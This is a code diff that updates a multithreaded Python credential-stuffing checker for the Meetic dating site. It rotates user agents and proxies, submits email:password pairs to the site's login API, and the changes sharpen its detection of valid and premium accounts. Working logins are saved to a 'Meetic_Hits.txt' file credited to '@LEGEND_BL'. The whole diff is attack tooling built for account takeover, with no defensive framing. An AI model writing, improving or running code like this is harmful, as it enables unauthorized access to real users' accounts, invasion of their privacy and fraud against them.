@@ -5,10 +5,10 @@ import time
 import warnings
 import threading
 import shutil
+import json
 from queue import Queue
 from colorama import init, Fore, Style
 from user_agent import generate_user_agent
-from urllib.parse import urlparse
 
 warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
@@ -17,12 +17,8 @@ init(autoreset=True)
 UA_CONFIGS = [
     {'os': 'win', 'navigator': 'chrome'},
     {'os': 'win', 'navigator': 'firefox'},
-    {'os': 'win', 'navigator': 'ie'},
     {'os': 'mac', 'navigator': 'chrome'},
-    {'os': 'mac', 'navigator': 'firefox'},
     {'os': 'linux', 'navigator': 'chrome'},
-    {'os': 'linux', 'navigator': 'firefox'},
-    {'os': 'android', 'navigator': 'chrome'},
 ]
 
 def get_random_user_agent():
@@ -30,7 +26,7 @@ def get_random_user_agent():
         config = random.choice(UA_CONFIGS)
         return generate_user_agent(os=config['os'], navigator=config['navigator'])
     except:
-        return generate_user_agent()
+        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"
 
 try:
     import socks
@@ -131,11 +127,6 @@ if not proxies:
     else:
         input(f"\n{Fore.RED}proxy.txt is REQUIRED for full checking! Press Enter to exit...")
         exit()
-else:
-    if not SOCKS_AVAILABLE:
-        has_socks = any(p.startswith(('socks4://', 'socks5://', 'socks5h://')) for p in proxies)
-        if has_socks:
-            print(f"{Fore.YELLOW}[!] Warning: SOCKS proxies detected but 'requests[socks]' not installed.\n")
 
 if use_proxies:
     threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
@@ -156,40 +147,98 @@ print_lock = threading.Lock()
 result_counter = 0
 
 def check_account(email, pwd, proxy_dict):
+    """Check Meetic account - FIX: Better response parsing for actual login validation"""
     s = requests.Session()
     userA = get_random_user_agent()
     
     try:
+        # Get main page first for cookies
         headers = {
             "User-Agent": userA,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
             "Accept-Encoding": "gzip, deflate, br",
         }
-        
         s.get("https://www.meetic.fr/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
         
-        headers["Content-Type"] = "application/json"
-        headers["Accept"] = "application/json"
-        headers["Origin"] = "https://www.meetic.fr"
-        headers["Referer"] = "https://www.meetic.fr/"
+        # Login API request
+        headers.update({
+            "Content-Type": "application/json",
+            "Accept": "application/json, text/plain, */*",
+            "Origin": "https://www.meetic.fr",
+            "Referer": "https://www.meetic.fr/login",
+            "X-Requested-With": "XMLHttpRequest",
+        })
+        
+        payload = {
+            "email": email,
+            "password": pwd,
+            "rememberMe": True
+        }
         
         r = s.post("https://www.meetic.fr/api/authentication/login",
-                   json={"email": email, "password": pwd, "rememberMe": True},
-                   headers=headers, proxies=proxy_dict, timeout=25, verify=False)
+                   json=payload, headers=headers, proxies=proxy_dict, timeout=25, verify=False)
+        
+        # FIX: Proper response parsing
+        try:
+            data = r.json()
+        except:
+            data = {}
         
         txt = r.text.lower()
-        if r.status_code == 200 and any(x in txt for x in ["token", "success", "userid", "profile", "session", "logged"]):
-            return "hit", "Valid"
-        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "unauthorized"]):
+        
+        # Check HTTP status codes
+        if r.status_code == 401:
+            return "fail", "Invalid credentials (401)"
+        
+        if r.status_code == 400:
+            return "fail", "Bad request (400)"
+        
+        if r.status_code == 403:
+            return "fail", "Forbidden (403)"
+        
+        # Check for error responses in JSON
+        if isinstance(data, dict):
+            # Check for error field
+            if "error" in data or "errors" in data:
+                error_msg = str(data.get("error", data.get("errors", "")))[:30]
+                return "fail", f"Error: {error_msg}"
+            
+            # Check for success indicators
+            if "userId" in data or "memberId" in data or "token" in data or "accessToken" in data:
+                # Valid login - get subscription info if available
+                subscription = data.get("subscription", {})
+                premium = subscription.get("isPremium", False)
+                if premium:
+                    return "hit", "Premium Account"
+                return "hit", "Valid Account"
+            
+            # Check for specific error messages
+            if "message" in data:
+                msg = str(data["message"]).lower()
+                if any(x in msg for x in ["invalid", "incorrect", "wrong", "password", "email", "not found"]):
+                    return "fail", "Invalid credentials"
+        
+        # Check text response for errors
+        if any(x in txt for x in ["invalid", "incorrect", "wrong", "unauthorized", "bad_credentials"]):
             return "fail", "Invalid credentials"
+        
+        # If status 200 but no clear success indicators, treat as failure
+        if r.status_code == 200:
+            # Check if response contains user data
+            if any(x in txt for x in ['"userid"', '"memberid"', '"profile"', '"subscription"']):
+                return "hit", "Valid Account"
+            # No user data found = invalid login
+            return "fail", "Login failed"
+        
         return "fail", f"Status {r.status_code}"
+        
     except requests.exceptions.Timeout:
         return "error", "Timeout"
     except requests.exceptions.ProxyError:
         return "error", "Proxy error"
-    except:
-        return "error", "Request failed"
+    except Exception as e:
+        return "error", f"Error: {str(e)[:30]}"
 
 def worker(q):
     global result_counter, hit_counter, fail_counter
@@ -228,9 +277,9 @@ def worker(q):
         if result == "hit":
             with counters_lock: hit_counter += 1
             with open("Meetic_Hits.txt", "a", encoding="utf-8") as f:
-                f.write(f"{email}:{pwd} | Code By - @LEGEND_BL\n")
+                f.write(f"{email}:{pwd} | {reason} | Code By - @LEGEND_BL\n")
             with print_lock:
-                print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd} | Status: Valid")
+                print(f"{Fore.WHITE}{num}. {Fore.GREEN}{email}:{pwd} | {reason}")
         else:
             with counters_lock: fail_counter += 1
             with print_lock:
